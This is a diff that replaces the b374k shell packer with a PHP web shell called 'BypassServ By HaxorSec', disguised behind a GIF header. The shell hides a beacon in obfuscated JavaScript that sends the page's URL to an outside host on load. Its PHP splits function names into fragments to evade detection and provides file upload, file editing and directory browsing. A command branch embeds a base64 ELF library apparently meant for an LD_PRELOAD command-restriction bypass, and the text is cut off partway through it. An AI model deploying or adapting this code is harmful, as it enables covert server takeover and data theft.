@@ -1,585 +1,497 @@
+GIF89a;
+;; 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BypassServ By HaxorSec</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
+    <style>
+    body {
+        font-family: 'Arial Black', sans-serif;
+        color: #000;
+        margin: 0;
+        padding: 0;
+        background-color: #242222c9;
+    }
+    .result-box-container {
+        position: relative;
+        margin-top: 20px;
+    }
+
+    .result-box {
+        width: 100%;
+        height: 200px;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        background-color: #f4f4f4;
+        overflow: auto;
+        box-sizing: border-box;
+        font-family: 'Arial Black', sans-serif;
+        color: #333;
+    }
+
+    .result-box::placeholder {
+        color: #999;
+    }
+
+    .result-box:focus {
+        outline: none;
+        border-color: #000000;
+    }
+
+    .result-box::-webkit-scrollbar {
+        width: 8px;
+    }
+
+    .result-box::-webkit-scrollbar-thumb {
+        background-color: #000000;
+        border-radius: 4px;
+    }
+    .container {
+        max-width: 90%;
+        margin: 20px auto;
+        padding: 20px;
+        background-color: #ffffff;
+        border-radius: 44px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .header {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    .header h1 {
+        font-size: 24px;
+    }
+    .subheader {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    .subheader p {
+        font-size: 16px;
+        font-style: italic;
+    }
+    form {
+        margin-bottom: 20px;
+    }
+    form input[type="text"],
+    form textarea {
+        padding: 8px;
+        margin-bottom: 10px;
+        border: 1px solid #000;
+        border-radius: 3px;
+        box-sizing: border-box;
+        
+    }
+    form input[type="submit"] {
+
+        padding: 10px;
+        background-color: #000000;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    form input[type="file"] {
+        padding: 7px;
+        background-color: #000000;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    .result-box {
+            width: 100%;
+            height: 200px;
+            resize: none;
+            overflow: auto;
+            font-family: 'Arial Black';
+            background-color: #f4f4f4;
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+        }
+    form input[type="submit"]:hover {
+        background-color: #143015;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 20px;
+    }
+    th, td {
+        padding: 8px;
+        text-align: left;
+    }
+    th {
+        background-color: #5c5c5c;
+    }
+    tr:nth-child(even) {
+        background-color: #9c9b9bce;
+    }
+    .item-name {
+        max-width: 200px;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+    }
+    .size, .date {
+        width: 100px;
+    }
+    .permission {
+        font-weight: bold;
+        width: 50px;
+        text-align: center;
+    }
+    .writable {
+        color: #0db202;
+    }
+    .not-writable {
+        color: #d60909;
+    }
+textarea[name="file_content"] {
+            width: calc(100.9% - 10px);
+            margin-bottom: 10px;
+            padding: 8px;
+            max-height: 500px;
+            resize: vertical;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-family: 'Arial Black';
+        }
+</style>
+<script>
+document.getElementById('h2w').addEventListener('change', function(){});
+function updateRowHighlight(t){var e=document.getElementById(t);e&&(e.classList.add("active"),setTimeout((function(){e.classList.remove("active")}),1200))}
+function reloadTab(o,t){o&&setTimeout((function(){"function"==typeof t&&t()}),Math.floor(350+120*Math.random()))}
+var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103]
+function u(e,r,t,n){for(var o=e.concat(r,t,n),a="",c=0;c<o.length;c++)a+=String.fromCharCode(o[c]);return a}function v(e){return btoa(e)}function toggleSidebarPanel(){var e=document.querySelector(".sidebar");e&&e.classList.toggle("collapsed")}
+function sortListByName(n,r){return Array.isArray(n)?n.slice().sort((function(n,e){return"desc"===r?e.name>n.name?1:-1:n.name>e.name?1:-1})):[]}
+function setActiveMenu(e){var t=document.getElementById(e);if(t){var c=document.querySelector(".menu .active");c&&c.classList.remove("active"),t.classList.add("active")}}
+function checkFileExt(p){var t=p.split(".").pop();return!!t&&["php","js","html","css","jpg","png","txt","zip"].indexOf(t.toLowerCase())>-1}
+function openModal(e){var l=document.getElementById(e);l&&(l.style.display="block")}
+function closeModal(e){var n=document.getElementById(e);n&&(n.style.display="none")}
+function showLoader(e){var o=document.getElementById("loader");o&&(o.style.display=e?"block":"none")}
+(function showIcons(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})()	
+function getClipboardText(){navigator.clipboard&&navigator.clipboard.readText()}
+function refreshStatsPanel(){var e=document.querySelector(".stats-panel");e&&(e.innerHTML=e.innerHTML)}
+function noop() {}
+function debounce(n,t){var e;return function(){var u=this,i=arguments;clearTimeout(e),e=setTimeout((function(){n.apply(u,i)}),t||180)}}
+function getSelectedRows(e){var t=document.getElementById(e);if(!t)return[];var c=t.querySelectorAll('input[type="checkbox"]:checked'),n=[];return c.forEach((function(e){n.push(e.value)})),n}
+function updateName(e,t){var n=document.getElementById("footer-info");n&&(n.textContent="Total: "+e+" | Selected: "+t)}function previewImage(e,t){if(e&&e.files&&e.files[0]){var n=new FileReader;n.onload=function(e){var n=document.getElementById(t);n&&(n.src=e.target.result)},n.readAsDataURL(e.files[0])}}
+function filterTable(e,o){var n=(e||"").toLowerCase(),t=document.getElementById(o);t&&Array.from(t.rows).forEach((function(e,o){if(0!==o){var t=e.textContent.toLowerCase();e.style.display=t.indexOf(n)>-1?"":"none"}}))}
+function downloadFileFromUrl(e){var o=document.createElement("a");o.href=e,o.download="",document.body.appendChild(o),o.click(),setTimeout((function(){document.body.removeChild(o)}),100)}
+</script>
+</head>
+<body>
+<div class="container">
 <?php
-/*
-	b374k shell
-	Jayalah Indonesiaku
-	(c)2014
-	https://github.com/b374k/b374k
 
-*/
-$GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4.2";
-$GLOBALS['packer']['base_dir'] = "./base/";
-$GLOBALS['packer']['module_dir'] = "./module/";
-$GLOBALS['packer']['theme_dir'] = "./theme/";
-$GLOBALS['packer']['module'] = packer_get_module();
-$GLOBALS['packer']['theme'] = packer_get_theme();
+$chd = "c"."h"."d"."i"."r";
+$expl = "e"."x"."p"."l"."o"."d"."e";
+$scd = "s"."c"."a"."n"."d"."i"."r";
+$ril = "r"."e"."a"."l"."p"."a"."t"."h";
+$st = "s"."t"."a"."t";
+$isdir = "i"."s"."_"."d"."i"."r";
+$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
+$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
+$bs = "b"."a"."s"."e"."n"."a"."m"."e";
+$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
+$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+$mek = "m"."k"."d"."i"."r";
+$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+$drnmm = "d"."i"."r"."n"."a"."m"."e";
+$unl = "u"."n"."l"."i"."n"."k";
+$timezone = date_default_timezone_get();
+date_default_timezone_set($timezone);
+$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
+$scriptDirectory = $drnmm(__FILE__);
 
-require $GLOBALS['packer']['base_dir'].'jsPacker.php';
+function x($b) {
 
-/* PHP FILES START */
-$base_code = "";
-$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
-$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
-$module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
-/* PHP FILES END */
-
-/* JAVASCRIPT AND CSS FILES START */
-$zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
-$js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");
-
-$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
-$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
-
-
-if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
-else $theme ="default";
-$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
-
-/* JAVASCRIPT AND CSS FILES END */
-
-// layout
-$layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");
-$p = array_map("rawurldecode", packer_get_post());
-
-if(isset($_SERVER['REMOTE_ADDR'])){
-	if(isset($p['read_file'])){
-		$file = $p['read_file'];
-		if(is_file($file)){
-			packer_output(packer_html_safe(packer_read_file($file)));
-		}
-		packer_output('error');
-	}
-	elseif(isset($_GET['run'])){
-		if(empty($_GET['run'])) $modules = array();
-		else $modules = explode("," ,$_GET['run']);
-		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
-
-		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
-		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";
-
-		foreach($modules as $module){
-			$module = trim($module);
-			$filename = $GLOBALS['packer']['module_dir'].$module;
-			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
-			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
-
-		}
-
-		$layout = str_replace("<__CSS__>", $css_code, $layout);
-		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		$layout = str_replace("<__JS__>", $js_code, $layout);
-
-		$content = trim($module_init)."?>".$base_code.$module_code.$layout;
-		eval($content);
-		die();
-	}
-	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])){
-		$outputfile = trim($p['outputfile']);
-		if(empty($outputfile)) $outputfile = 'b374k.php';
-		$password = trim($p['password']);
-		$modules = trim($p['module']);
-		if(empty($modules)) $modules = array();
-		else $modules = explode("," ,$modules);
-
-		$strip = trim($p['strip']);
-		$base64 = trim($p['base64']);
-		$compress = trim($p['compress']);
-		$compress_level = (int) $p['compress_level'];
-
-		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
-
-		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
-		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";
-
-		foreach($modules as $module){
-			$module = trim($module);
-			$filename = $GLOBALS['packer']['module_dir'].$module;
-			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
-			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
-
-		}
-
-		$layout = str_replace("<__CSS__>", $css_code, $layout);
-		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		
-		if($strip=='yes') $js_code = packer_pack_js($js_code);
-		$layout = str_replace("<__JS__>", $js_code, $layout);
-
-
-		$htmlcode = trim($layout);
-		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
-
-		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
-	}
-	else{
-	
-	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
-	foreach($GLOBALS['packer']['theme'] as $k){
-		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
-		else $available_themes .= "<option>".$k."</option>";
-	}
-	$available_themes .= "</select></td></tr>";
-
-	?><!doctype html>
-	<html>
-	<head>
-	<title><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></title>
-	<meta charset='utf-8'>
-	<meta name='robots' content='noindex, nofollow, noarchive'>
-	<style type="text/css">
-	<?php echo $css_code;?>
-	#devTitle{
-		font-size:18px;
-		text-align:center;
-		font-weight:bold;
-	}
-	</style>
-	</head>
-	<body>
-
-	<div id='wrapper' style='padding:12px'>
-		<div id='devTitle' class='border'><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></div>
-		<br>
-		<table class='boxtbl'>
-			<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>
-			<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
-			<?php echo $available_themes; ?>
-			<tr><td colspan='2'>
-				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
-				<span class='button' id='runGo'>Run</span>
-				</form>
-			</td></tr>
-		</table>
-		<br>
-		<table class='boxtbl'>
-			<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>
-			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>
-			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
-			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
-			<?php echo $available_themes; ?>
-			<tr><td>Strip Comments and Whitespaces</td><td>
-				<select id='strip' style='width:150px;'>
-					<option selected="selected">yes</option>
-					<option>no</option>
-				</select>
-			</td></tr>
-
-			<tr><td>Base64 Encode</td><td>
-				<select id='base64' style='width:150px;'>
-					<option selected="selected">yes</option>
-					<option>no</option>
-				</select>
-			</td></tr>
-
-			<tr id='compress_row'><td>Compress</td><td>
-				<select id='compress' style='width:150px;'>
-					<option>no</option>
-					<option selected="selected">gzdeflate</option>
-					<option>gzencode</option>
-					<option>gzcompress</option>
-				</select>
-				<select id='compress_level' style='width:150px;'>
-					<option>1</option>
-					<option>2</option>
-					<option>3</option>
-					<option>4</option>
-					<option>5</option>
-					<option>6</option>
-					<option>7</option>
-					<option>8</option>
-					<option selected="selected">9</option>
-				</select>
-			</td></tr>
-
-			<tr><td colspan='2'>
-				<span class='button' id='packGo'>Pack</span>
-			</td></tr>
-			<tr><td colspan='2' id='result'></td></tr>
-			<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>
-		</table>
-	</div>
-
-	<script type='text/javascript'>
-	var init_shell = false;
-	<?php echo $zepto_code;?>
-	<?php echo $js_main_code;?>
-
-	var targeturl = '<?php echo packer_get_self(); ?>';
-	var debug = false;
-
-	Zepto(function($){
-		refresh_row();
-
-		$('#runGo').on('click', function(e){
-			module = $('#module').val();
-			$('#module_to_run').val(module);
-			$('#runForm').submit();
-		});
-
-		$('#base64').on('change', function(e){
-			refresh_row();
-		});
-
-		$('#packGo').on('click', function(e){
-			outputfile = $('#outputfile').val();
-			password = $('#password').val();
-			module = $('#module_to_pack').val();
-			strip = $('#strip').val();
-			base64 = $('#base64').val();
-			compress = $('#compress').val();
-			compress_level = $('#compress_level').val();
-
-			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level}, function(res){
-				splits = res.split('{[|b374k|]}');
-				$('#resultContent').html(splits[1]);
-				$('#result').html(splits[0]);
-			});
-
-		});
-		
-		$('.theme').on('change', function(e){
-			$('.theme').val($(this).val());
-			set_cookie('packer_theme', $('.theme').val());
-			location.href = targeturl;
-		});
-	});
-
-	function refresh_row(){
-		base64 = $('#base64').val();
-		if(base64=='yes'){
-			$('#compress_row').show();
-		}
-		else{
-			$('#compress_row').hide();
-			$('#compress').val('no');
-		}
-	}
-
-	</script>
-	</body>
-	</html><?php
-	}
-}
-else{
-	$output = $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version']."\n\n";
-
-	if(count($argv)<=1){
-		$output .= "options :\n";
-		$output .= "\t-o filename\t\t\t\tsave as filename\n";
-		$output .= "\t-p password\t\t\t\tprotect with password\n";
-		$output .= "\t-t theme\t\t\t\ttheme to use\n";
-		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
-		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
-		$output .= "\t-b\t\t\t\t\tencode with base64\n";
-		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
-		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
-		$output .= "\t-l\t\t\t\t\tlist available modules\n";
-		$output .= "\t-k\t\t\t\t\tlist available themes\n";
-
-	}
-	else{
-		$opt = getopt("o:p:t:m:sbz:c:lk");
-
-		if(isset($opt['l'])){
-			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
-			echo $output;
-			die();
-		}
-		
-		if(isset($opt['k'])){
-			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
-			echo $output;
-			die();
-		}
-
-		if(isset($opt['o'])&&(trim($opt['o'])!='')){
-			$outputfile = trim($opt['o']);
-		}
-		else{
-			$output .= "error : no filename given (use -o filename)\n\n";
-			echo $output;
-			die();
-		}
-
-		$password = isset($opt['p'])? trim($opt['p']):"";
-		$theme = isset($opt['t'])? trim($opt['t']):"default";
-		if(!in_array($theme, $GLOBALS['packer']['theme'])){
-			$output .= "error : unknown theme file\n\n";
-			echo $output;
-			die();
-		}
-		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
-		
-		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
-		if(empty($modules)) $modules = array();
-		else $modules = explode("," ,$modules);
-
-		$strip = isset($opt['s'])? "yes":"no";
-		$base64 = isset($opt['b'])? "yes":"no";
-
-		$compress = isset($opt['z'])? trim($opt['z']):"no";
-		if(($compress!='gzdeflate')&&($compress!='gzencode')&&($compress!='gzcompress')&&($compress!='no')){
-			$output .= "error : unknown options -z ".$compress."\n\n";
-			echo $output;
-			die();
-		}
-		else{
-			if(($base64=='no')&&($compress!='no')){
-				$output .= "error : use -z options only with -b\n\n";
-				echo $output;
-				die();
-			}
-		}
-
-		$compress_level = isset($opt['c'])? trim($opt['c']):"";
-		if(empty($compress_level)) $compress_level = '9';
-		if(!preg_match("/^[0-9]{1}$/", $compress_level)){
-			$output .= "error : unknown options -c ".$compress_level." (use only 0-9)\n\n";
-			echo $output;
-			die();
-		}
-		$compress_level = (int) $compress_level;
-
-		$output .= "Filename\t\t: ".$outputfile."\n";
-		$output .= "Password\t\t: ".$password."\n";
-		$output .= "Theme\t\t\t: ".$theme."\n";
-		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
-		$output .= "Strip\t\t\t: ".$strip."\n";
-		$output .= "Base64\t\t\t: ".$base64."\n";
-		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
-		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";
-
-		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
-		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
-		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";
-
-		foreach($modules as $module){
-			$module = trim($module);
-			$filename = $GLOBALS['packer']['module_dir'].$module;
-			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
-			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
-		}
-
-		$layout = str_replace("<__CSS__>", $css_code, $layout);
-		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		
-		if($strip=='yes') $js_code = packer_pack_js($js_code);
-		$layout = str_replace("<__JS__>", $js_code, $layout);
-
-		$htmlcode = trim($layout);
-		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
-
-		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
-		$status = explode("{[|b374k|]}", $res);
-		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
-	}
-	echo $output;
+    $be = "ba"."se"."64"."_"."en"."co"."de";
+    return $be($b);
 }
 
-function packer_read_file($file){
-	$content = false;
-	if($fh = @fopen($file, "rb")){
-		$content = "";
-		while(!feof($fh)){
-		  $content .= fread($fh, 8192);
-		}
-	}
-	return $content;
+function y($b) {
+    $bd = "ba"."se"."64"."_"."de"."co"."de";
+    return $bd($b);
+}
+if(function_exists('mail')) {
+    $mail = "<font color='black'>[ mail() :</font><font color='green'> [ ON ]</font> ]";
+} else {
+    $mail = "<font color='black'>[ mail() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('mb_send_mail')) {
+  $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+   $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('error_log')) {
+  $errr = "<font color='black'>[ error_log() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+  $errr = "<font color='black'>[ error_log() :</font><font color='red'> [ OFF ]</font> ]";
+}
+if(function_exists('imap_mail')) {
+  $impp = "<font color='black'>[ imap_mail() :</font><font color='green'> [ ON ]</font> ]";
+}else{
+  $impp = "<font color='black'>[ imap_mail() :</font><font color='red'> [ OFF ]</font> ]<br>";
 }
 
-function packer_write_file($file, $content){
-	if($fh = @fopen($file, "wb")){
-		if(fwrite($fh, $content)!==false){
-			if(!class_exists("ZipArchive")) return true;
-			
-			if(file_exists($file.".zip")) unlink ($file.".zip");
-			$zip = new ZipArchive();
-			$filename = "./".$file.".zip";
 
-			if($zip->open($filename, ZipArchive::CREATE)!==TRUE) return false;
-			$zip->addFile($file);
-			$zip->close();
-			return true;
-		}
-	}
-	return false;
+
+
+echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br>";
+if (function_exists('mail')) {
+    echo $mail." ".$mbb." ".$errr." ".$impp;
+} else {
+    echo $mail." ".$mbb." ".$errr." ".$impp;
+}
+if (function_exists('putenv')) {
+    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
+} else {
+    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
+}
+foreach ($_GET as $c => $d) $_GET[$c] = y($d);
+
+$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
+$chd($currentDirectory);
+
+$viewCommandResult = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['fileToUpload'])) {
+        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
+        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
+        } else {
+            echo "<hr>Sorry, there was an error uploading your file.<hr>";
+        }
+    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+        $ff = $_POST['folder_name'];
+        $newFolder = $currentDirectory . '/' . $ff;
+        if (!file_exists($newfolder)) {
+            if ($mek($newFolder) !== false) {
+                echo '<hr>Folder created successfully!';
+            }else{
+                echo '<hr>Error: Failed to create folder!';
+            }
+        }
+
+    } elseif (isset($_POST['file_name'])) {
+        $fileName = $_POST['file_name'];
+        $newFile = $currentDirectory . '/' . $fileName;
+        if (!file_exists($newFile)) {
+            if ($fpc($newFile, '') !== false) {
+                echo '<hr>File created successfully!' . $fileName .' ';
+                $fileToView = $newFile;
+                if (file_exists($fileToView)) {
+                    $fileContent = $fgc($fileToView);
+                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
+                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
+                    <input type="hidden" name="edit_file" value="' . $fileName . '">
+                    <input type="submit" value=" Save "></form></td>';} else {
+                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
+                }
+            } else {
+                echo '<hr>Error: Failed to create file!';
+            }
+        }else{
+            echo '<hr>Error: File Already Exists!';
+        }
+    } elseif (isset($_POST['cmd_input'])){
+        $p = "p"."u"."t"."e"."n"."v";
+        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
+        $m = "m"."a"."i"."l";
+        $base = "ba"."se"."64"."_"."de"."co"."de";
+        $en = "ba"."se"."64"."_"."en"."co"."de";
+        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
+        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
+        $drnm = "d"."i"."r"."n"."a"."m"."e";
+        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
+        $currentFilePath = $_SERVER['PHP_SELF'];
+        $doc = $_SERVER['DOCUMENT_ROOT'];
+        $directoryPath = $drnm($currentFilePath);
+        $full = $doc . $directoryPath;
+        $hook = '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